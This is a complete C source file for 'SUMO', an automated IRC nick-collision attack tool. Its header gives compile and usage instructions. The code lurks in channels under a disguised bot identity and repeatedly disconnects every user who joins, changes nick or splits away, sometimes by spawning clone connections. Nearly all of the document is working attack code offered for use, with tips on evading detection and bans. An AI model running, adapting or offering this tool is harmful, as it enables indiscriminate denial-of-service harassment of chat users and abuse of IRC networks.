/*
 * SUMO nick collider (v1.00)
 * Author: CKeeper [ckeeper@text.org]
 * Version 1.00:
 *    - Now outputs private messages if PRINT_MSGS is defined
 *    - Should compile on more different kinds of machines
 *    - Now accepts channel names without # signs (it adds them)
 *    - Has a PRINT_NOISE define to switch on/off 'Attempting to collide' msgs
 *    - No more lame goto's in the code
 *
 * Usage: 
 *    sumo <server>[:<port>] <kill server>[:<port>] <nick> <list of channels>
 *
 * A fast automatic nick collider, like a C version of Serpent.
 *
 * To compile:
 *     - On Linux and probably other systems with gcc, this will give you
 *       a nice, small executable:
 *         gcc -O2 -fomit-frame-pointer -s -o sumo sumo.c
 *     - If that doesn't work, try this:
 *         gcc -o sumo sumo.c
 *     - If you don't have gcc, try this:
 *         cc -o sumo sumo.c
 * This program may not compile on non-Posix/BSD compliant machines like AIX
 * or HP/UX without modifications to the code.  If you get some kind of error
 * about there being no 'getdtablesize()', edit the code and find the one
 * occurence of getdtablesize() and replace it with a constant like '64'.
 * If you get an error about sys_errlist, add the line:
 *   extern char *sys_errlist[];
 * somewhere below the includes.
 *
 * The first <server> argument is the server that the channel-lurking bot
 * will connect to.  This should be a close, fast, not-lagged server.
 * The <kill server> is the server used for nick-change/join kills and should
 * be a far-away (net-wise), lagged server.
 * The <nick> is the nickname of the channel watcher.
 * The <list of channels> is a list (seperated by spaces) of all the channels
 * the bot should lurk and collide on.
 *
 * Both the servers must accept connections from your host, and should be
 * servers that you wouldn't be crushed about being K-Lined (banned) from. :P
 *
 * When the program starts, it will create a watcher bot and a collide
 * connection.  The watcher bot will join all the channels in the list and
 * lurk.  The collide connection will be an un-logged-in connection to the
 * kill server that will be there to assume someone's nick to collide them.
 * The program will attempt to collide if any of the following things
 * happen:
 *     - Someone changes their nick: The bot will immediatly try to take
 *       the same nickname on the kill server (the collide connection) and
 *       if the kill server is lagged enough, the person will be collided.
 *     - Someone joins the channel: The bot will try to assume the same
 *       nickname on the kill server and if the person just signed on or
 *       reconnected from a collide, and if the kill server is lagged enough,
 *       the person will be collided.  This will often get people as they
 *       reconnect from a collide and keep killing them over and over.
 *     - Someone signs off on a netsplit (signoff message with two server
 *       names in it): The bot will create a connection with the nickname
 *       of the person who was split on the same server that it is connected
 *       to (the first server argument).  Since we know that the person is
 *       split away from this server, when the net reconnects they will be
 *       collided.
 *
 * The third response (the split-collide response) can be disabled in the
 * #define's below.  It is probably a good idea to disable this if you plan
 * to run the bot un-attended since it can cause the bot to create a whole
 * lot of clones and get you in trouble with admins.  (like running this bot
 * at all isn't going to get you in trouble with admins :)
 *
 * The bot makes no discrimination about who it kills.  That means it isn't
 * useful for war against certain people, but whole channels.  If the people
 * in the channel never catch on and kick/ban it, the bot will keep lurking
 * and colliding whenever it gets a chance.
 *
 * If you don't know what a collide is, or how it works, you probably won't
 * know how to compile/use this program anyway.
 *
 * If you want to run sumo from inside IRC (/exec sumo ...) then #undef the
 * RUN_BACKGROUND option below.  If you want sumo to go into the background
 * like a daemon, #define the option.  If RUN_BACKGROUND is defined, when
 * you want to kill the bot you must kill it's process with the 'kill'
 * command. (Of course, sometimes you have to do this with /exec'd processes
 * too)
 *
 * If you run the bot from inside IRC with '/exec sumo ...' you may need to
 * leave the # signs off of the channel names.  This version lets you do that.
 */

/* #define this if you want the bot to try to collide people if they split
 * away (see above) */
#define SPLIT_AWAY_COLLIDE

/* This is the IRCNAME used for the channel watcher bot.  Should be something
 * that doesn't give the bot away */
#define WATCHER_IRCNAME "PHeaR THe DaeMoNS. THeY aRe WaTCHiNG."

/* This is the username that the watcher bot will try to signon under.  This
 * will have no effect if your system runs identd.  Also, you shouldn't mix
 * the case of the letters in this string since some servers refuse mixed-case
 * usernames. */
#define WATCHER_USERNAME "omus"

/* #define this if you want private messages printed to stdout */
#define PRINT_MSGS

/* #define this if you want the 'Attempting to collide ...' messages to be
 * printed.  You should probably #undef this if you will be /exec'ing it
 * from IRC */
#define PRINT_NOISE

/* #define this if you want the bot to output a complete log of everything
 * it sees (in raw irc format) to stdout */
#undef OUTPUT_IRCLOG

/* #define this if you want the bot to fork into the background like a daemon.
 * If this is defined, you should run the bot with stdout redirected to
 * /dev/null or to a file (>>/dev/null) so the bot won't keep writing status
 * messages to your console. */
#undef RUN_BACKGROUND

/* The timeout settings below shouldn't need to be changed */

/* Timeout (in seconds) for the watcher bot connection */
#define WATCHER_TIMEOUT 60

/* Timeout for the kill server connection */
#define KILLER_TIMEOUT 60

/* Timeout for netsplit-collider connections */
#define SPLITKILL_TIMEOUT 8

/* Every ?? seconds the bot makes sure it is on all it's channels */
#define REJOIN_INTERVAL 60

/* ------------------------------------------------------------------------ */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <signal.h>
#include <errno.h>

extern errno;
char *channel_list[24];
int numchannels,watcherplug,killerplug;
int botport = 6667;
int killport = 6667;
int linepos = 0;
int loggedin = 0;
fd_set myfds,nullfds,backfds;
char outbuf[750],inbuf[4096],linebuf[750],junkbuf[255];
char botserv[75],killserv[75],nick[10];
char randjunk[] = "abcdefghijklmnopqrstuvwxyz";

/* Server numerics/commands */
#define TOOMANYCHANNELS "405"
#define ERRONEUSNICKNAME "432"
#define NICKNAMEINUSE "433"
#define LOGINACCEPTED "001"
#define BANNEDFROMSERV "465"
#define CLOSINGLINK "losin" /* Matched as a substring */
#define USERSIGNOFF "QUIT"
#define USERNICKCHANGE "NICK"
#define USERJOIN "JOIN"
#define USERKICK "KICK"
#define USERMSG "PRIVMSG"
#define USERNOTICE "NOTICE"

void connectout_timeout(int signum);
int connectout(char *hname,int portnum,int timeout);
void outsock(int plug,char *buff);
void joinall(void);
void signal_handler(int signum);
char *randcrap(int numchars);
char *nickonly(char *nickuserhost);
void connect_watcher(void);
void connect_killer(void);
int my_stricmp(char *str1,char *str2);
void process_incoming_line(char *rline);
void select_loop(void);
void bad_commandline(char *progname);
void main(int argc,char *argv[]);

int timedout;
void connectout_timeout(signum)
int signum;
{
	timedout++;
}
int connectout(hname,portnum,timeout)
char *hname;
int portnum,timeout;
{
	struct hostent *host_name;
	struct sockaddr_in socketname;
	int plug,p;
	
	if ((plug = socket(AF_INET,SOCK_STREAM,0)) < 0)
	{
		return -1;
	}
	socketname.sin_family = AF_INET;
	if ((host_name = gethostbyname(hname)) == (struct hostent *)NULL)
	{
		return -2;
	}
	socketname.sin_port = htons(portnum);
	memcpy(&socketname.sin_addr,host_name->h_addr,host_name->h_length);
	signal(SIGABRT,connectout_timeout);
	p = fork();
	if (p < 0)
	{
		fprintf(stderr,"Cannot fork!\n");
		exit(EXIT_FAILURE);
	}
	timedout = 0;
	/* My lame timeout implementation that doesn't eat tons of CPU time
	 * looping and doesn't clobber queued alarms */
	if (!p)
	{
		sleep(timeout);
		kill(getppid(),SIGABRT);
		exit(EXIT_SUCCESS);
	}
	for (;;)
	{
		if ((connect(plug,(struct sockaddr *)&socketname,sizeof(socketname))) < 0)
		{
			if (!((errno == EINTR)&&(!timedout)))
			{
				if (timedout)
				{
					errno = ETIMEDOUT;
				}
				kill(p,SIGKILL);
				signal(SIGABRT,SIG_DFL);
				waitpid(p,(int *)NULL,0);
				return -3;
			}
		} else {
			kill(p,SIGKILL);
			signal(SIGABRT,SIG_DFL);
			waitpid(p,(int *)NULL,0);
			return plug;
		}
	}
}

void outsock(plug,buff)
int plug;
char *buff;
{
	send(plug,buff,strlen(buff),0);
}

void joinall(void)
{
	int i;

	for (i=0;i<=numchannels;i++)
	{
		if (*channel_list[i] != '#')
		{
			sprintf(outbuf,"JOIN #%s\n",channel_list[i]);
		} else
			sprintf(outbuf,"JOIN %s\n",channel_list[i]);
		outsock(watcherplug,outbuf);
	}
}

void signal_handler(signum)
int signum;
{
	if (signum == SIGALRM)
	{
		joinall();
		fflush(stdout);
		alarm(REJOIN_INTERVAL);
	}
	signal(signum,signal_handler);
}

/* I'm not gonna bother explaining why the offset to a random index.  Just
 * take it out and see what happens :) */
char *randcrap(numchars)
int numchars;
{
	int c,i;
	
	i = random() % 200;
	for (c=0;c<numchars;c++)
	{
		junkbuf[c+i] = randjunk[random() % 26];
	}
	junkbuf[numchars+i] = '\0';
	return (char *)&junkbuf[i];
}

char *nickonly(nickuserhost)
char *nickuserhost;
{
	char *retptr;

	if (strchr(nickuserhost,'!'))
	{
		strcpy(junkbuf,nickuserhost);
		retptr = strtok(junkbuf,"!");
		if (strchr(retptr,':'))
		{
			retptr++;
		}
		return (char *)retptr;
	} else {
		return (char *)NULL;
	}
}

void connect_watcher(void)
{
	watcherplug = connectout(botserv,botport,WATCHER_TIMEOUT);
	if (watcherplug < 0)
	{
		if (watcherplug == -2)
		{
			printf(" Could not resolve hostname\n");
			exit(EXIT_FAILURE);
		}
		printf(" %s\n",sys_errlist[errno]);
		exit(EXIT_FAILURE);
	}
	sprintf(outbuf,"NICK %s\nUSER %s . . :%s\nMODE %s :+i\n",nick,WATCHER_USERNAME,WATCHER_IRCNAME,nick);
	outsock(watcherplug,outbuf);
	joinall();
	loggedin = 0;
	FD_SET(watcherplug,&myfds);
}

void connect_killer(void)
{
	killerplug = connectout(killserv,killport,KILLER_TIMEOUT);
	if (killerplug < 0)
	{
		if (killerplug == -2)
		{
			printf(" Could not resolve hostname\n");
			exit(EXIT_FAILURE);
		}
		printf(" %s\n",sys_errlist[errno]);
		exit(EXIT_FAILURE);
	}
	sprintf(outbuf,"USER %s . . :%s %s %s\n",randcrap(8),randcrap(random() % 8),randcrap(random() % 16),randcrap(random() % 4));
	outsock(killerplug,outbuf);
	FD_SET(killerplug,&myfds);
}

/* This one returns 1 if they match, 0 if they don't */
int my_stricmp(str1,str2)
char *str1,*str2;
{
	for (;;)
	{
		if ((*str1 & 64) != (*str2 & 64))
		{
			return 0;
		}
		str1++;
		str2++;
		if ((*str1 == '\0')||(*str2 == '\0'))
		{
			return 1;
		}
	}
}

void process_incoming_line(rline)
char *rline;
{
	char *numeric,*fromuser,*tmpptr;
	char linebak[800];
#ifdef SPLIT_AWAY_COLLIDE
	int newplug;
#endif

	if (!strncmp(rline,"PING",4))
	{
		sprintf(outbuf,"PONG :%s\n",nick);
		outsock(watcherplug,outbuf);
		return;
	}
#ifdef OUTPUT_IRCLOG
	printf("%s\n",rline);
#endif
	strcpy(linebak,rline);
	fromuser = strtok(rline," ");
	numeric = strtok(NULL," ");
	if (!strcmp(numeric,USERNICKCHANGE))
	{
		tmpptr = strtok(NULL," ");
		if (strchr(tmpptr,':'))
		{
			tmpptr++;
		}
		if (strcmp(tmpptr,nick))
		{
			sprintf(outbuf,"NICK %s\n",tmpptr);
			outsock(killerplug,outbuf);
#ifdef PRINT_NOISE
			printf("Attempting to collide %s on nick change...\n",tmpptr); fflush(stdout);
#endif
		}
		return;
	}
	if ((!strcmp(numeric,USERJOIN))&&(strcmp(nickonly(fromuser),nick)))
	{
		sprintf(outbuf,"NICK %s\n",nickonly(fromuser));
		outsock(killerplug,outbuf);
#ifdef PRINT_NOISE
		printf("Attempting to collide %s on join...\n",nickonly(fromuser)); fflush(stdout);
#endif
		return;
	}
	if (!strcmp(numeric,TOOMANYCHANNELS))
	{
		fprintf(stderr,"%i is too many channels!\n",numchannels);
		exit(EXIT_FAILURE);
	}
	if (!strcmp(numeric,ERRONEUSNICKNAME))
	{
		fprintf(stderr,"%s",nick);
		strcpy(nick,randcrap(9));
		fprintf(stderr,": bad nickname, changing nickname to %s\n",nick);
		sprintf(outbuf,"NICK %s\n",nick);
		outsock(watcherplug,outbuf);
		return;
	}
	if (!strcmp(numeric,NICKNAMEINUSE))
	{
		printf("%s",nick);
		if (strlen(nick) >= 9)
		{
			nick[8] = '\0';
		}
		sprintf(junkbuf,"_%s",nick);
		strcpy(nick,junkbuf);
		printf(": nickname in use, changing nickname to %s\n",nick); fflush(stdout);
		sprintf(outbuf,"NICK %s\n",nick);
		outsock(watcherplug,outbuf);
		joinall();
		return;
	}
	if (!strcmp(numeric,LOGINACCEPTED))
	{
		if (!loggedin)
		{
			printf("Logged into %s as %s...\n",botserv,nick); fflush(stdout);
		}
		return;
	}
	if (!strcmp(numeric,BANNEDFROMSERV))
	{
		fprintf(stderr,"%s: banned from server!\n",botserv);
		exit(EXIT_FAILURE);
	}
	if (strstr(numeric,CLOSINGLINK))
	{
		printf("!!! %s\n",linebak); fflush(stdout);
		return;
	}
#ifdef SPLIT_AWAY_COLLIDE
	if (!strcmp(numeric,USERSIGNOFF))
	{
		if (strchr(strtok(strrchr(linebak,':')," "),'.'))
		{
			if (strchr(strtok(NULL," "),'.'))
			{
				newplug = connectout(botserv,botport,SPLITKILL_TIMEOUT);
				if (newplug >= 0)
				{
					sprintf(outbuf,"NICK %s\nUSER %s . . :%s %s\n",nickonly(fromuser),randcrap(7),randcrap(random() % 10),randcrap(random() % 12));
					outsock(newplug,outbuf);
					printf("Collidebot %s connected to %s\n",nickonly(fromuser),botserv); fflush(stdout);
				}
			}
		}
	}
#endif
	if (!strcmp(numeric,USERKICK))
	{
		strcpy(outbuf,linebak);
		strtok(linebak," ");
		strtok(NULL," ");
		tmpptr = strtok(NULL," ");
		if (!strcmp(strtok(NULL," "),nick))
		{
			printf("Kicked from channel %s by %s (%s)\n",tmpptr,nickonly(fromuser),(strrchr(outbuf,':')+1)); fflush(stdout);
			joinall();
		}
	}
#ifdef PRINT_MSGS
	if ((!strcmp(numeric,USERMSG))||(!strcmp(numeric,USERNOTICE)))
	{
		if ((my_stricmp(strtok(NULL," "),nick))&&(!strstr(fromuser,botserv)))
		{
			if (*fromuser == ':')
			{
				fromuser++;
			}
			printf("[%s] %s\n",fromuser,(strrchr(linebak,':')+1)); fflush(stdout);
		}
	}
#endif
}

void select_loop(void)
{
	int amtread,i;
	
	memcpy(&backfds,&myfds,sizeof(backfds));
	if (select(getdtablesize(),&myfds,&nullfds,&nullfds,(struct timeval *)NULL) < 0)
	{
		if (errno == EINTR)
		{
			FD_ZERO(&myfds);
		} else {
			fprintf(stderr,"Select error: %s\n",sys_errlist[errno]);
			exit(EXIT_FAILURE);
		}
	}
	if (FD_ISSET(watcherplug,&myfds))
	{
		amtread = recvfrom(watcherplug,&inbuf,sizeof(inbuf),0,(struct sockaddr *)NULL,(int *)NULL);
		if (amtread > 0)
		{
			for (i=0;i<amtread;i++)
			{
				linebuf[linepos] = inbuf[i];
				if (linebuf[linepos] == '\n')
				{
					linebuf[linepos] = '\0';
					if (linebuf[linepos-1] == '\015')
					{
						linebuf[linepos-1] = '\0';
					}
					process_incoming_line(linebuf);
					linepos = 0;
				} else {
					linepos++;
				}
			}
		} else {
			close(watcherplug);
			FD_CLR(watcherplug,&backfds);
			printf("Reconnecting watcher bot..."); fflush(stdout);
			connect_watcher();
			printf(" done.\n"); fflush(stdout);
			FD_SET(watcherplug,&backfds);
		}
	}
	if (FD_ISSET(killerplug,&myfds))
	{
		if (recv(killerplug,&junkbuf,sizeof(junkbuf),0) < 1)
		{
			close(killerplug);
			FD_CLR(killerplug,&backfds);
			printf("Reconnecting killer..."); fflush(stdout);
			connect_killer();
			printf(" done.\n"); fflush(stdout);
			FD_SET(killerplug,&backfds);
		}
	}
	memcpy(&myfds,&backfds,sizeof(myfds));
}
				
void bad_commandline(progname)
char *progname;
{
	fprintf(stderr,"Usage: %s <server>[:<port>] <kill server>[:<port>] <nick> <list of channels>\n",progname);
	exit(EXIT_SUCCESS);
}

void main(argc,argv)
int argc;
char *argv[];
{
	int i;

	if (argc < 5)
	{
		bad_commandline(argv[0]);
	}

	numchannels = argc - 5;
	for (i=0;i<=numchannels;i++)
	{
		channel_list[i] = argv[i+4];
	}
	if (strchr(argv[1],':'))
	{
		strcpy(botserv,strtok(argv[1],":"));
		sscanf(strtok(NULL,":"),"%i",&botport);
	} else {
		strcpy(botserv,argv[1]);
	}
	if (strchr(argv[2],':'))
	{
		strcpy(killserv,strtok(argv[2],":"));
		sscanf(strtok(NULL,":"),"%i",&killport);
	} else {
		strcpy(killserv,argv[2]);
	}
	if (strlen(argv[3]) <= 9)
	{
		strcpy(nick,argv[3]);
	} else {
		bad_commandline(argv[0]);
	}

#ifdef RUN_BACKGROUND
	if ((i = fork()))
	{
		if (i < 0)
		{
			fprintf(stderr,"Cannot fork!\n");
			exit(EXIT_FAILURE);
		}
		fprintf(stderr,"Running as pid %i.  Type 'kill -KILL %i' to kill.\n",i,i);
		exit(EXIT_SUCCESS);
	}
#endif

	FD_ZERO(&myfds);
	FD_ZERO(&nullfds);
	FD_ZERO(&backfds);
	signal(SIGALRM,signal_handler);
	signal(SIGPIPE,signal_handler);
	signal(SIGHUP,SIG_IGN);
	srandom(getpid()+getuid());
	alarm(120);

	printf("Connecting watcher bot to %s:%i...",botserv,botport); fflush(stdout);
	connect_watcher();
	printf(" done.\nConnecting killer to %s:%i...",killserv,killport); fflush(stdout);
	connect_killer();
	printf(" done.\n"); fflush(stdout);
	for(;;)
	{
		select_loop();
	}
}

